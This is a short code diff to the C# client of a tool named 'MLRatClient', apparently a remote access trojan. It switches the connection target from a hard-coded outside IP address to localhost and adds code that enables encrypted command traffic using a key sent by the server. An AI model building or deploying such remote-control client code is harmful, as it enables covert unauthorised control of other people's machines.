@@ -46,8 +46,8 @@ namespace MLRatClient
             networkClient.OnDataRetrieved += networkClient_OnDataRetrieved;
             networkClient.OnDisconnect += networkClient_OnDisconnect;
             networkClient.OnConnect += NetworkClient_OnConnect;
-            //networkClient.ConnectAsync("127.0.0.1", 12345);
-            networkClient.ConnectAsync("45.55.136.217", 12345);
+            networkClient.ConnectAsync("127.0.0.1", 12345);
+            
         }
 
         private static void NetworkClient_OnConnect(eSock.Client sender, bool success)
@@ -254,6 +254,11 @@ namespace MLRatClient
 
                     if (command == NetworkPacket.Connect)
                     {
+                        networkClient.Encryption.Key = (string)data[2];
+                        networkClient.Encryption.Enabled = true;
+                        Console.WriteLine("Encryption Enabled: {0}", networkClient.Encryption.Enabled);
+                        Console.WriteLine("Encryption key set ({0})", networkClient.Encryption.Key);
+
                         SendChecksums();
                     }
                 }
